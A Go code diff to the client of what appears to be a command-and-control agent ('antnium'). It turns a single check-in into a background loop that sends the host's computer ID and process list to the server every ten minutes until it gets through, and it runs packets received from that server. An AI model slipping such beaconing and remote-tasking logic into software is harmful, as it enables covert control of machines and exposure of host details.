@@ -6,6 +6,7 @@ import (
 	"math/rand"
 	"net/http"
 	"strconv"
+	"time"
 
 	"github.com/dobin/antnium/pkg/model"
 	log "github.com/sirupsen/logrus"
@@ -44,20 +45,15 @@ func (s *Client) Start() {
 	}
 
 	s.DownstreamManager.StartListeners(s)
-	go s.Upstream.Start()
-
-	err := s.sendPing()
-	if err != nil {
-		// Handle server not reachable
-		log.Error("Could not ping: ", err.Error())
-	}
+	go s.Upstream.Start() // Thread: Upstream
+	go s.sendPing()       // Thread: sendPing
 
 	var p model.Packet
 	for {
 		// Block until we receive a packet from server
 		p = <-s.Upstream.Channel()
 
-		p, err = s.DownstreamManager.Do(p)
+		p, err := s.DownstreamManager.Do(p)
 		if err != nil {
 			log.Error("Err: ", err.Error())
 		}
@@ -67,7 +63,8 @@ func (s *Client) Start() {
 	}
 }
 
-func (s *Client) sendPing() error {
+// sendPing is a Thread which tries to send initial ping packet to the server, lifetime: until success
+func (s *Client) sendPing() {
 	arguments := make(model.PacketArgument)
 
 	response := make(model.PacketResponse)
@@ -77,13 +74,13 @@ func (s *Client) sendPing() error {
 	model.AddArrayToResponse("processes", s.Config.Processes, response)
 
 	packet := model.NewPacket("ping", s.Config.ComputerId, "0", arguments, response)
-
-	err := s.Upstream.SendPacket(packet)
-	if err != nil {
-		return err
+	for {
+		err := s.Upstream.SendPacket(packet)
+		if err == nil {
+			break // when no error -> success
+		}
+		time.Sleep(time.Minute * 10) // 10mins for now
 	}
-
-	return nil
 }
 
 // SendDownstreams is used to notify server about any new downstreams
